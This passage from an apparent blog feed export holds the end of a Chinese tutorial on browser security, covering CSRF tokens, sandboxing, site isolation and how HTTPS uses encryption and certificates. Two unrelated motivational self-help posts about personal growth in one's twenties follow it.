属性，再根据实际情况判断是否使用 Referer 值。</p><h4 id="3-CSRF-Token"><a href="#3-CSRF-Token" class="headerlink" title="3. CSRF Token"></a>3. CSRF Token</h4><p>除了使用以上两种方式来防止 CSRF 攻击之外，还可以采用 CSRF Token 来验证，这个流程比较好理解，大致分为两步。</p><p>第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。你可以参考下面示例代码：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/109.png" alt="img"></p><p>第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。</p><h3 id="总结-33"><a href="#总结-33" class="headerlink" title="总结"></a>总结</h3><p>我们结合一个实际案例介绍了 CSRF 攻击，要发起 CSRF 攻击需要具备三个条件：目标站点存在漏洞、用户要登录过目标站点和黑客需要通过第三方站点发起攻击。</p><p>根据这三个必要条件，我们又介绍了该如何防止 CSRF 攻击，具体来讲主要有三种方式：充分利用好 Cookie 的 SameSite 属性、验证请求的来源站点和使用 CSRF Token。这三种方式需要合理搭配使用，这样才可以有效地防止 CSRF 攻击。</p><p>再结合前面两篇文章，我们可以得出页面安全问题的主要原因就是浏览器为同源策略开的两个“后门”：一个是在页面中可以任意引用第三方资源，另外一个是通过 CORS 策略让 XMLHttpRequest 和 Fetch 去跨域请求资源。</p><p>为了解决这些问题，我们引入了 CSP 来限制页面任意引入外部资源，引入了 HttpOnly 机制来禁止 XMLHttpRequest 或者 Fetch 发送一些关键 Cookie，引入了 SameSite 和 Origin 来防止 CSRF 攻击。</p><p>通过这三篇文章的分析，相信你应该已经能搭建<strong>Web 页面安全</strong>的知识体系网络了。有了这张网络，你就可以将 HTTP 请求头和响应头中各种安全相关的字段关联起来，比如 Cookie 中的一些字段，还有 X-Frame-Options、X-Content-Type-Options、X-XSS-Protection 等字段，也可以将 CSP、CORS 这些知识点关联起来。当然这些并不是浏览器安全的全部，后面两篇文章我们还会介绍</p><h2 id="4-安全沙箱：页面和系统之间的隔离墙"><a href="#4-安全沙箱：页面和系统之间的隔离墙" class="headerlink" title="4. 安全沙箱：页面和系统之间的隔离墙"></a>4. 安全沙箱：页面和系统之间的隔离墙</h2><p><strong>从稳定性视角来看，单进程架构的浏览器是不稳定的</strong>，因为只要浏览器进程中的任意一个功能出现异常都有可能影响到整个浏览器，如页面卡死、浏览器崩溃等。不过浏览器的稳定性并不是本文讨论的重点，我们今天主要聊的是<strong>浏览器架构是如何影响到操作系统安全的</strong></p><p>浏览器本身的漏洞是单进程浏览器的一个主要问题，如果浏览器被曝出存在漏洞，那么在这些漏洞没有被及时修复的情况下，黑客就有可能通过恶意的页面向浏览器中注入恶意程序，其中最常见的攻击方式是利用<strong>缓冲区溢出</strong>，不过需要<strong>注意这种类型的攻击和 XSS 注入的脚本是不一样的</strong></p><ul><li>XSS 攻击只是将恶意的 JavaScript 脚本注入到页面中，虽然能窃取一些 Cookie 相关的数据，但是 XSS 无法对操作系统进行攻击。</li><li>而通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、监听用户键盘输入信息以及读取用户硬盘上的文件内容。</li></ul><blockquote><p>和 XSS 攻击页面相比，这类攻击无疑是枚“核弹”，它会将整个操作系统的内容都暴露给黑客，这样我们操作系统上所有的资料都是不安全的了。</p></blockquote><h3 id="安全视角下的多进程架构"><a href="#安全视角下的多进程架构" class="headerlink" title="安全视角下的多进程架构"></a>安全视角下的多进程架构</h3><p>现代浏览器的设计目标是<strong>安全、快速</strong>和<strong>稳定</strong>，而这种核弹级杀伤力的安全问题就是一个很大的潜在威胁，因此在设计现代浏览器的体系架构时，需要解决这个问题。</p><p><img src="http://blog.poetries.top/img-repo/2019/11/110.png" alt="img"></p><p>观察上图，我们知道浏览器被划分为<strong>浏览器内核</strong>和<strong>渲染内核</strong>两个核心模块，其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程组成的，渲染内核就是渲染进程。那如果我们在浏览器中打开一个页面，这两个模块是怎么配合的呢？</p><p>所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上，而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。</p><p>设计现代浏览器体系架构时，将浏览器划分为不同的进程是为了增加其稳定性。虽然设计成了多进程架构，不过这些模块之间的沟通方式却有些复杂，也许你还有以下问题：</p><ul><li>为什么一定要通过浏览器内核去请求资源，再将数据转发给渲染进程，而不直接从进程内部去请求网络资源？</li><li>为什么渲染进程只负责生成页面图片，生成图片还要经过 IPC 通知浏览器内核模块，然后让浏览器内核去负责展示图片？</li></ul><p>通过以上方式不是增加了工程的复杂度吗？</p><p>要解释现代浏览器为什么要把这个流程弄得这么复杂，我们就得从系统安全的角度来分析。</p><h3 id="安全沙箱"><a href="#安全沙箱" class="headerlink" title="安全沙箱"></a>安全沙箱</h3><p>不过在解释这些问题之前，我们得先看看什么是安全沙箱。</p><p>上面我们分析过了，由于渲染进程需要执行 DOM 解析、CSS 解析、网络图片解码等操作，如果渲染进程中存在系统级别的漏洞，那么以上操作就有可能让恶意的站点获取到渲染进程的控制权限，进而又获取操作系统的控制权限，这对于用户来说是非常危险的。</p><p>因为网络资源的内容存在着各种可能性，所以浏览器会默认所有的网络资源都是不可信的，都是不安全的。但谁也不能保证浏览器不存在漏洞，只要出现漏洞，黑客就可以通过网络内容对用户发起攻击。</p><p>我们知道，如果你下载了一个恶意程序，但是没有执行它，那么恶意程序是不会生效的。同理，浏览器之于网络内容也是如此，浏览器可以安全地下载各种网络资源，但是如果要执行这些网络资源，比如解析 HTML、解析 CSS、执行 JavaScript、图片编解码等操作，就需要非常谨慎了，因为一不小心，黑客就会利用这些操作对含有漏洞的浏览器发起攻击。</p><p>基于以上原因，我们需要在渲染进程和操作系统之间建一道墙，即便渲染进程由于存在漏洞被黑客攻击，但由于这道墙，黑客就获取不到渲染进程之外的任何操作权限。<strong>将渲染进程和操作系统隔离的这道墙就是我们要聊的安全沙箱</strong></p><p>浏览器中的安全沙箱是利用操作系统提供的安全技术，让渲染进程在执行过程中无法访问或者修改操作系统中的数据，在渲染进程需要访问系统资源的时候，需要通过浏览器内核来实现，然后将访问的结果通过 IPC 转发给渲染进程。</p><p>安全沙箱最小的保护单位是进程。因为单进程浏览器需要频繁访问或者修改操作系统的数据，所以单进程浏览器是无法被安全沙箱保护的，而现代浏览器采用的多进程架构使得安全沙箱可以发挥作用。</p><h3 id="安全沙箱如何影响各个模块功能"><a href="#安全沙箱如何影响各个模块功能" class="headerlink" title="安全沙箱如何影响各个模块功能"></a>安全沙箱如何影响各个模块功能</h3><p>我们知道安全沙箱最小的保护单位是进程，并且能限制进程对操作系统资源的访问和修改，这就意味着如果要让安全沙箱应用在某个进程上，那么这个进程必须没有读写操作系统的功能，比如读写本地文件、发起网络请求、调用 GPU 接口等。</p><p>了解了被安全沙箱保护的进程会有一系列的受限操作之后，接下来我们就可以分析渲染进程和浏览器内核各自都有哪些职责，如下图：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/111.png" alt="img"></p><p>通过该图，我们可以看到由于渲染进程需要安全沙箱的保护，因此需要把在渲染进程内部涉及到和系统交互的功能都转移到浏览器内核中去实现。</p><p><strong>那安全沙箱是如何影响到各个模块功能的呢？</strong></p><h4 id="1-持久存储"><a href="#1-持久存储" class="headerlink" title="1. 持久存储"></a>1. 持久存储</h4><p>我们先来看看安全沙箱是如何影响到浏览器持久存储的。由于安全沙箱需要负责确保渲染进程无法直接访问用户的文件系统，但是在渲染进程内部有访问 Cookie 的需求、有上传文件的需求，为了解决这些文件的访问需求，所以现代浏览器将读写文件的操作全部放在了浏览器内核中实现，然后通过 IPC 将操作结果转发给渲染进程。</p><p>具体地讲，如下文件内容的读写都是在浏览器内核中完成的：</p><ul><li>存储 Cookie 数据的读写。通常浏览器内核会维护一个存放所有 Cookie 的 Cookie 数据库，然后当渲染进程通过 JavaScript 来读取 Cookie 时，渲染进程会通过 IPC 将读取 Cookie 的信息发送给浏览器内核，浏览器内核读取 Cookie 之后再将内容返回给渲染进程。</li><li>一些缓存文件的读写也是由浏览器内核实现的，比如网络文件缓存的读取。</li></ul><h4 id="2-网络访问"><a href="#2-网络访问" class="headerlink" title="2. 网络访问"></a>2. 网络访问</h4><p>同样有了安全沙箱的保护，在渲染进程内部也是不能直接访问网络的，如果要访问网络，则需要通过浏览器内核。不过浏览器内核在处理 URL 请求之前，会检查渲染进程是否有权限请求该 URL，比如检查 XMLHttpRequest 或者 Fetch 是否是跨站点请求，或者检测 HTTPS 的站点中是否包含了 HTTP 的请求。</p><h4 id="3-用户交互"><a href="#3-用户交互" class="headerlink" title="3. 用户交互"></a>3. 用户交互</h4><p>渲染进程实现了安全沙箱，还影响到了一个非常重要的用户交互功能。</p><p>通常情况下，如果你要实现一个 UI 程序，操作系统会提供一个界面给你，该界面允许应用程序与用户交互，允许应用程序在该界面上进行绘制，比如 Windows 提供的是 HWND，Linux 提供的 X Window，我们就把 HWND 和 X Window 统称为窗口句柄。应用程序可以在窗口句柄上进行绘制和接收键盘鼠标消息。</p><p>不过在现代浏览器中，由于每个渲染进程都有安全沙箱的保护，所以在渲染进程内部是无法直接操作窗口句柄的，这也是为了限制渲染进程监控到用户的输入事件。</p><p>由于渲染进程不能直接访问<strong>窗口句柄</strong>，所以渲染进程需要完成以下两点大的改变。</p><ul><li>第一点，渲染进程需要渲染出位图。为了向用户显示渲染进程渲染出来的位图，渲染进程需要将生成好的位图发送到浏览器内核，然后浏览器内核将位图复制到屏幕上。</li><li>第二点，操作系统没有将用户输入事件直接传递给渲染进程，而是将这些事件传递给浏览器内核。然后浏览器内核再根据当前浏览器界面的状态来判断如何调度这些事件，如果当前焦点位于浏览器地址栏中，则输入事件会在浏览器内核内部处理；如果当前焦点在页面的区域内，则浏览器内核会将输入事件转发给渲染进程。</li></ul><p>之所以这样设计，就是为了限制渲染进程有监控到用户输入事件的能力，所以所有的键盘鼠标事件都是由浏览器内核来接收的，然后浏览器内核再通过 IPC 将这些事件发送给渲染进程。</p><p>上面我们分析了由于渲染进程引入了安全沙箱，所以浏览器的持久存储、网络访问和用户交互等功能都不能在渲染进程内直接使用了，因此我们需要把这些功能迁移到浏览器内核中去实现，这让原本比较简单的流程变得复杂了。</p><h3 id="站点隔离（Site-Isolation）"><a href="#站点隔离（Site-Isolation）" class="headerlink" title="站点隔离（Site Isolation）"></a>站点隔离（Site Isolation）</h3><p>所谓站点隔离是指 Chrome 将同一站点（包含了相同根域名和相同协议的地址）中相互关联的页面放到同一个渲染进程中执行。</p><p>最开始 Chrome 划分渲染进程是以标签页为单位，也就是说整个标签页会被划分给某个渲染进程。但是，按照标签页划分渲染进程存在一些问题，原因就是一个标签页中可能包含了多个 iframe，而这些 iframe 又有可能来自于不同的站点，这就导致了多个不同站点中的内容通过 iframe 同时运行在同一个渲染进程中。</p><p>目前所有操作系统都面临着两个 A 级漏洞——幽灵（Spectre）和熔毁（Meltdown），这两个漏洞是由处理器架构导致的，很难修补，黑客通过这两个漏洞可以直接入侵到进程的内部，如果入侵的进程没有安全沙箱的保护，那么黑客还可以发起对操作系统的攻击。</p><p>所以如果一个银行站点包含了一个恶意 iframe，然后这个恶意的 iframe 利用这两个 A 级漏洞去入侵渲染进程，那么恶意程序就能读取银行站点渲染进程内的所有内容了，这对于用户来说就存在很大的风险了。</p><p>因此 Chrome 几年前就开始重构代码，将标签级的渲染进程重构为 iframe 级的渲染进程，然后严格按照同一站点的策略来分配渲染进程，这就是 Chrome 中的站点隔离。</p><p>实现了站点隔离，就可以将恶意的 iframe 隔离在恶意进程内部，使得它无法继续访问其他 iframe 进程的内容，因此也就无法攻击其他站点了。</p><p>值得注意是，2019 年 10 月 20 日 Chrome 团队宣布安卓版的 Chrome 已经全面支持站点隔离</p><h2 id="5-HTTPS：让数据传输更安全"><a href="#5-HTTPS：让数据传输更安全" class="headerlink" title="5. HTTPS：让数据传输更安全"></a>5. HTTPS：让数据传输更安全</h2><p>浏览器安全主要划分为三大块内容：页面安全、系统安全和网络安全。前面我们用四篇文章介绍了页面安全和系统安全，也聊了浏览器和 Web 开发者是如何应对各种类型的攻击，本文是我们专栏的最后一篇，我们就接着来聊聊网络安全协议 HTTPS。</p><p>我们先从 HTTP 的明文传输的特性讲起，在上一个模块的三篇文章中我们分析过，起初设计 HTTP 协议的目的很单纯，就是为了传输超文本文件，那时候也没有太强的加密传输的数据需求，所以 HTTP 一直保持着明文传输数据的特征。但这样的话，在传输过程中的每一个环节，数据都有可能被窃取或者篡改，这也意味着你和服务器之间还可能有个中间人，你们在通信过程中的一切内容都在中间人的掌握中，如下图：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/112.png" alt="img"></p><p>从上图可以看出，我们使用 HTTP 传输的内容很容易被中间人窃取、伪造和篡改，通常我们把这种攻击方式称为<strong>中间人攻击</strong></p><p>具体来讲，在将 HTTP 数据提交给 TCP 层之后，数据会经过用户电脑、WiFi 路由器、运营商和目标服务器，在这中间的每个环节中，数据都有可能被窃取或篡改。比如用户电脑被黑客安装了恶意软件，那么恶意软件就能抓取和篡改所发出的 HTTP 请求的内容。或者用户一不小心连接上了 WiFi 钓鱼路由器，那么数据也都能被黑客抓取或篡改。</p><h3 id="在-HTTP-协议栈中引入安全层"><a href="#在-HTTP-协议栈中引入安全层" class="headerlink" title="在 HTTP 协议栈中引入安全层"></a>在 HTTP 协议栈中引入安全层</h3><p>鉴于 HTTP 的明文传输使得传输过程毫无安全性可言，且制约了网上购物、在线转账等一系列场景应用，于是倒逼着我们要引入<strong>加密方案</strong></p><p>从 HTTP 协议栈层面来看，我们可以在 TCP 和 HTTP 之间插入一个安全层，所有经过安全层的数据都会被加密或者解密，你可以参考下图：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/113.png" alt="img"></p><p>从图中我们可以看出 HTTPS 并非是一个新的协议，通常 HTTP 直接和 TCP 通信，HTTPS 则先和安全层通信，然后安全层再和 TCP 层通信。也就是说 HTTPS 所有的安全核心都在安全层，它不会影响到上面的 HTTP 协议，也不会影响到下面的 TCP&#x2F;IP，因此要搞清楚 HTTPS 是如何工作的，就要弄清楚安全层是怎么工作的。</p><p>总的来说，安全层有两个主要的职责：<strong>对发起 HTTP 请求的数据进行加密操作</strong>和<strong>对接收到 HTTP 的内容进行解密操作</strong></p><p>我们知道了安全层最重要的就是加解密，那么接下来我们就利用这个安全层，一步一步实现一个从简单到复杂的 HTTPS 协议。</p><h4 id="第一版：使用对称加密"><a href="#第一版：使用对称加密" class="headerlink" title="第一版：使用对称加密"></a>第一版：使用对称加密</h4><p>提到加密，最简单的方式是使用对称加密。所谓<strong>对称加密是指加密和解密都使用的是相同的密钥</strong></p><p>了解了对称加密，下面我们就使用对称加密来实现第一版的 HTTPS。</p><p>要在两台电脑上加解密同一个文件，我们至少需要知道加解密方式和密钥，因此，在 HTTPS 发送数据之前，浏览器和服务器之间需要协商加密方式和密钥，过程如下所示：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/114.png" alt="img"></p><p>通过上图我们可以看出，HTTPS 首先要协商加解密方式，这个过程就是 HTTPS 建立安全连接的过程。为了让加密的密钥更加难以破解，我们让服务器和客户端同时决定密钥，具体过程如下：</p><ul><li>浏览器发送它所支持的加密套件列表和一个随机数 client-random，这里的<strong>加密套件是指加密的方法</strong>，加密套件列表就是指浏览器能支持多少种加密方法列表。</li><li>服务器会从加密套件列表中选取一个加密套件，然后还会生成一个随机数 service-random，并将 service-random 和加密套件列表返回给浏览器。</li><li>最后浏览器和服务器分别返回确认消息。</li></ul><p>这样浏览器端和服务器端都有相同的 client-random 和 service-random 了，然后它们再使用相同的方法将 client-random 和 service-random 混合起来生成一个密钥 master secret，有了密钥 master secret 和加密套件之后，双方就可以进行数据的加密传输了。</p><p>通过将对称加密应用在安全层上，我们实现了第一个版本的 HTTPS，虽然这个版本能够很好地工作，但是其中传输 client-random 和 service-random 的过程却是明文的，这意味着黑客也可以拿到协商的加密套件和双方的随机数，由于利用随机数合成密钥的算法是公开的，所以黑客拿到随机数之后，也可以合成密钥，这样数据依然可以被破解，那么黑客也就可以使用密钥来伪造或篡改数据了。</p><h4 id="第二版：使用非对称加密"><a href="#第二版：使用非对称加密" class="headerlink" title="第二版：使用非对称加密"></a>第二版：使用非对称加密</h4><p>不过非对称加密能够解决这个问题，因此接下来我们就利用非对称加密来实现我们第二版的 HTTPS，不过在讨论具体的实现之前，我们先看看什么是非对称加密。</p><p>和对称加密只有一个密钥不同，<strong>非对称加密算法有 A、B 两把密钥，如果你用 A 密钥来加密，那么只能使用 B 密钥来解密；反过来，如果你要 B 密钥来加密，那么只能用 A 密钥来解密</strong></p><p>在 HTTPS 中，服务器会将其中的一个密钥通过明文的形式发送给浏览器，我们把这个密钥称为<strong>公钥</strong>，服务器自己留下的那个密钥称为<strong>私钥</strong>。顾名思义，<strong>公钥是每个人都能获取到的，而私钥只有服务器才能知道，不对任何人公开</strong>。下图是使用非对称加密改造的 HTTPS 协议：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/115.png" alt="img"></p><p>根据该图，我们来分析下使用非对称加密的请求流程。</p><ul><li>首先浏览器还是发送加密套件列表给服务器。</li><li>然后服务器会选择一个加密套件，不过和对称加密不同的是，使用非对称加密时服务器上需要有用于浏览器加密的公钥和服务器解密 HTTP 数据的私钥，由于公钥是给浏览器加密使用的，因此服务器会将加密套件和公钥一道发送给浏览器。</li><li>最后就是浏览器和服务器返回确认消息。</li></ul><p>这样浏览器端就有了服务器的公钥，在浏览器端向服务器端发送数据时，就可以使用该公钥来加密数据。由于公钥加密的数据只有私钥才能解密，所以即便黑客截获了数据和公钥，他也是无法使用公钥来解密数据的。</p><ul><li><strong>第一个是非对称加密的效率太低</strong>。这会严重影响到加解密数据的速度，进而影响到用户打开页面的速度。</li><li><strong>第二个是无法保证服务器发送给浏览器的数据安全</strong>。虽然浏览器端可以使用公钥来加密，但是服务器端只能采用私钥来加密，私钥加密只有公钥能解密，但黑客也是可以获取得到公钥的，这样就不能保证服务器端数据的安全了。</li></ul><h4 id="第三版：对称加密和非对称加密搭配使用"><a href="#第三版：对称加密和非对称加密搭配使用" class="headerlink" title="第三版：对称加密和非对称加密搭配使用"></a>第三版：对称加密和非对称加密搭配使用</h4><p>基于以上两点原因，我们最终选择了一个更加完美的方案，那就是<strong>在传输数据阶段依然使用对称加密，但是对称加密的密钥我们采用非对称加密来传输</strong>。下图就是改造后的版本：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/116.png" alt="img"></p><p><strong>从图中可以看出，改造后的流程是这样的：</strong></p><ul><li>首先浏览器向服务器发送对称加密套件列表、非对称加密套件列表和随机数 client-random；</li><li>服务器保存随机数 client-random，选择对称加密和非对称加密的套件，然后生成随机数 service-random，向浏览器发送选择的加密套件、service-random 和公钥；</li><li>浏览器保存公钥，并利用 client-random 和 service-random 计算出来 pre-master，然后利用公钥对 pre-master 加密，并向服务器发送加密后的数据；</li><li>最后服务器拿出自己的私钥，解密出 pre-master 数据，并返回确认消息。</li></ul><p>到此为止，服务器和浏览器就有了共同的 client-random、service-random 和 pre-master，然后服务器和浏览器会使用这三组随机数生成<strong>对称密钥</strong>，因为服务器和浏览器使用同一套方法来生成密钥，所以最终生成的密钥也是相同的。</p><p>有了对称加密的密钥之后，双方就可以使用对称加密的方式来传输数据了。</p><p>需要特别注意的一点，<strong>pre-master 是经过公钥加密之后传输的，所以黑客无法获取到 pre-master，这样黑客就无法生成密钥，也就保证了黑客无法破解传输过程中的数据了</strong></p><h4 id="第四版：添加数字证书"><a href="#第四版：添加数字证书" class="headerlink" title="第四版：添加数字证书"></a>第四版：添加数字证书</h4><p>通过对称和非对称混合方式，我们完美地实现了数据的加密传输。不过这种方式依然存在着问题，比如我要打开极客时间的官网，但是黑客通过 DNS 劫持将极客时间官网的 IP 地址替换成了黑客的 IP 地址，这样我访问的其实是黑客的服务器了，黑客就可以在自己的服务器上实现公钥和私钥，而对浏览器来说，它完全不知道现在访问的是个黑客的站点。</p><p>所以我们还需要服务器向浏览器提供证明“我就是我”，那怎么证明呢？</p><p>这里我们结合实际生活中的一个例子，比如你要买房子，首先你需要给房管局提交你买房的材料，包括银行流水、银行证明、身份证等，然后房管局工作人员在验证无误后，会发给你一本盖了章的房产证，房产证上包含了你的名字、身份证号、房产地址、实际面积、公摊面积等信息。</p><p>在这个例子中，你之所以能证明房子是你自己的，是因为引进了房管局这个<strong>权威机构</strong>，并通过这个权威机构给你颁发一个<strong>证书</strong></p><p>对于浏览器来说，数字证书有两个作用：一个是通过数字证书向浏览器证明服务器的身份，另一个是数字证书里面包含了服务器公钥。</p><p>接下来我们看看含有数字证书的 HTTPS 的请求流程，你可以参考下图：</p><p><img src="http://blog.poetries.top/img-repo/2019/11/117.png" alt="img"></p><p><strong>相较于第三版的 HTTPS 协议，这里主要有两点改变：</strong></p><ul><li>服务器没有直接返回公钥给浏览器，而是返回了数字证书，而公钥正是包含在数字证书中的；</li><li>在浏览器端多了一个证书验证的操作，验证了证书之后，才继续后续流程。</li></ul><p>通过引入数字证书，我们就实现了服务器的身份认证功能，这样即便黑客伪造了服务器，但是由于证书是没有办法伪造的，所以依然无法欺骗用户。</p><h3 id="数字证书的申请和验证"><a href="#数字证书的申请和验证" class="headerlink" title="数字证书的申请和验证"></a>数字证书的申请和验证</h3><p>在第四版的 HTTPS 中，我们提到过，有了数字证书，黑客就无法欺骗用户了，不过我们并没有解释清楚如何通过数字证书来证明用户身份，所以接下来我们再来把这个问题解释清楚。</p><p><strong>如何申请数字证书</strong></p><p>我们先来看看如何向 CA 申请证书。比如极客时间需要向某个 CA 去申请数字证书，通常的申请流程分以下几步：</p><ul><li>首先极客时间需要准备一套私钥和公钥，私钥留着自己使用；</li><li>然后极客时间向 CA 机构提交公钥、公司、站点等信息并等待认证，这个认证过程可能是收费的；</li><li>CA 通过线上、线下等多种渠道来验证极客时间所提供信息的真实性，如公司是否存在、企业是否合法、域名是否归属该企业等；</li><li>如信息审核通过，CA 会向极客时间签发认证的数字证书，包含了极客时间的公钥、组织信息、CA 的信息、有效时间、证书序列号等，这些信息都是明文的，同时包含一个 CA 生成的签名。</li></ul><p>这样我们就完成了极客时间数字证书的申请过程。前面几步都很好理解，不过最后一步数字签名的过程还需要解释下：首先 CA 使用<strong>Hash 函数</strong>来计算极客时间提交的明文信息，并得出<strong>信息摘要</strong>；然后 CA 再使用它的私钥对信息摘要进行加密，<strong>加密后的密文就是 CA 颁给极客时间的数字签名</strong>。这就相当于房管局在房产证上盖的章，这个章是可以去验证的，同样我们也可以通过数字签名来验证是否是该 CA 颁发的。</p><h3 id="浏览器如何验证数字证书"><a href="#浏览器如何验证数字证书" class="headerlink" title="浏览器如何验证数字证书"></a>浏览器如何验证数字证书</h3><p>有了 CA 签名过的数字证书，当浏览器向极客时间服务器发出请求时，服务器会返回数字证书给浏览器。</p><p>浏览器接收到数字证书之后，会对数字证书进行验证。首先浏览器读取证书中相关的明文信息，采用 CA 签名时相同的 Hash 函数来计算并得到<strong>信息摘要 A</strong>；然后再利用对应 CA 的公钥解密签名数据，得到<strong>信息摘要 B</strong>；对比信息摘要 A 和信息摘要 B，如果一致，则可以确认证书是合法的，即证明了这个服务器是极客时间的；同时浏览器还会验证证书相关的域名信息、有效时间等信息。</p><p>这时候相当于验证了 CA 是谁，但是这个 CA 可能比较小众，浏览器不知道该不该信任它，然后浏览器会继续查找给这个 CA 颁发证书的 CA，再以同样的方式验证它上级 CA 的可靠性。通常情况下，操作系统中会内置信任的顶级 CA 的证书信息（包含公钥），如果这个 CA 链中没有找到浏览器内置的顶级的 CA，证书也会被判定非法。</p><p><strong>另外，在申请和使用证书的过程中，还需要注意以下三点：</strong></p><ul><li>申请数字证书是不需要提供私钥的，要确保私钥永远只能由服务器掌握；</li><li>数字证书最核心的是 CA 使用它的私钥生成的数字签名；</li><li>内置 CA 对应的证书称为根证书，根证书是最权威的机构，它们自己为自己签名，我们把这称为自签名证书。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>这些话，送给快要21岁却一事无成的自己</title>
      <link href="/2022/09/30/views/%E8%BD%AC%E8%BD%BD/%E8%BF%99%E4%BA%9B%E8%AF%9D%EF%BC%8C%E9%80%81%E7%BB%99%E5%BF%AB%E8%A6%8121%E5%B2%81%E5%8D%B4%E4%B8%80%E4%BA%8B%E6%97%A0%E6%88%90%E7%9A%84%E8%87%AA%E5%B7%B1/"/>
      <url>/2022/09/30/views/%E8%BD%AC%E8%BD%BD/%E8%BF%99%E4%BA%9B%E8%AF%9D%EF%BC%8C%E9%80%81%E7%BB%99%E5%BF%AB%E8%A6%8121%E5%B2%81%E5%8D%B4%E4%B8%80%E4%BA%8B%E6%97%A0%E6%88%90%E7%9A%84%E8%87%AA%E5%B7%B1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>1、<strong>如果你时常感到迷茫和焦虑，这并不是一件坏事。</strong><br>只有想要摆脱平庸的人才会感到焦虑，它的出现往往伴随着进步。</p><p>2、<strong>自律，是年轻人最重要的品质之一。</strong>它的确很枯燥，很机械，但确实能提高我们的整体效率，生活变得更好。吃不了自律的苦， 就只能吃平庸的苦。</p><p>3、<strong>目前的社会，还谈不上阶级固化，顶多是有钱和没钱的区别。</strong></p><p><strong>阶级没有固化，上升通道也没有关闭。</strong>现在依然有很多机会，如果拼的是权利和资本，那 90%的人都是毫无机会的。但事实并非如此，肉眼可见努力的年轻人一代比一代过得更好。<br><strong>起点再低又如何，观念可以改，技能可以学。</strong>也许有些环境你改变不了，但你有脚，随时可以走。</p><p>4、对大多数普通人来说，改变命运的机会真的不多。<strong>关键在于命运来敲门的时候你是否听得到，是否已经准备好了。</strong></p><p>5、一个人成长的黄金时间，就是 20 多岁这段时间。<br>这段时间你<strong>可以训练体能、培养专注力、锻炼分配精力，哪一项都足以让你在 5 年后远超同龄人。</strong><br>而你只关心微博热榜、明星家的狗换了什么衣服，在知乎杠上 100 层楼。 *<em>偌大的信息流中，你只摄取了一小部分的娱乐信息，给了你紧跟时事的错觉，但它们和你到底有什么关系呢？</em></p><p>6、<strong>大部分人看似的努力，不过是愚蠢导致的。</strong>什么熬夜看书看到天亮、连续几天只睡几小时、多久没放假了，如果这些东西也值得夸耀，那么富士康流水线上的任何一个人都比你努力多了。<br><strong>努力本身就是一种才能。</strong>不是单一的“用力、持续使劲”就是努力。它不<strong>单单是一种信念和意志力，更需要策略，而且需要在策略上不断学习和优化。</strong><br>所以，除了“用力”以外，该采用什么样的策略投入时间和精力，这件事才是需要我们反复思考的。</p><p>7、因为互联网，我们每天都能接收大量的知识，今天有个专家说沟通很重要，你就去学沟通，明天身边人做电商赚了钱，你就去学开网店。<strong>没有清晰的目标，耳根子软，就会贪多贪全，什么都想做，什么都想学，东一脚西一脚，哪脚踩得都不深。</strong><br>所以我建议你，从现在开始明确三观。<strong>知道自己想要什么，想发展什么专长，就能分清哪些知识和技能才是真正需要的，对目标才更有帮助。</strong>长久之后，你的生活方式、思维习惯，都会被刷新，影响至远。</p><p>8、希望你的婚姻是为了“自己”。而不是因为相处久了、年龄大了、懒得找了、草率地决定跟一个人共度余生。<br>如果你不知道什么样的结婚对象适合自己，给你三句话作为判断标准：</p><blockquote><p>生理上有冲动</p><p>精神上受鼓舞</p><p>沟通上很流畅</p></blockquote><p>最后，你并不是一无所有。家人、朋友、工作、甚至你的小宠物，都在陪着你。这个世界也许很冷酷，但也有温柔，它让失意者温暖，让悲伤者前行。</p>]]></content>
      
      
      <categories>
          
          <category> 道理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文章 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>戒骄戒躁</title>
      <link href="/2022/09/10/views/%E8%BD%AC%E8%BD%BD/%E6%88%92%E9%AA%84%E6%88%92%E8%BA%81/"/>
      <url>/2022/09/10/views/%E8%BD%AC%E8%BD%BD/%E6%88%92%E9%AA%84%E6%88%92%E8%BA%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>1.<strong>看高质量的纪录片。</strong>当你决定放弃无效社交，你也会放弃无效的爆米花电影。而无论你喜欢什么类型的影片，最后都会回归最真实的纪录片。<strong>因为一部优秀的纪录片的知识含量，很多时候比一本杂书多 N 倍。</strong></p><p>2.微博热搜、朋友圈早晚刷 1 遍就够了，刷 100 